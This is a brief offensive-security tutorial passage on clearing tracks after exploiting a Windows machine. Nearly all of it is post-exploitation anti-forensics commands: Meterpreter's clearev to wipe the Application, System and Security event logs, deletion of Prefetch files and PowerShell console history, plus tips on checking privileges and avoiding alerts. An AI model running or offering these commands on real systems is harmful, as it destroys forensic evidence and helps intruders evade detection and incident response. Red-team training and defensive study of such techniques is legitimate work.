Clearing tracks on a Windows system after exploitation is often part of anti-forensics or post-exploitation cleanup. Whenever you successfully gain access to a Windows target, all of your activity is being logged in the form of Windows events. Meterpreter provides you with the ability to clear the entire Windows Event log. This can be done by running the following commands:

```shell
clearev # meterpreter
# This command clears the Application, System, and Security event logs

rm -f C:\\Windows\\Prefetch\\*
# Deletes files that show what was executed recently

rm -f C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
# If you spawned a shell or PowerShell from Meterpreter
```

Always check your session privileges (getuid, getprivs) â€” you may need SYSTEM or Administrator rights for full cleanup. Avoid overdoing it: aggressive log clearing is suspicious and often triggers alerts.
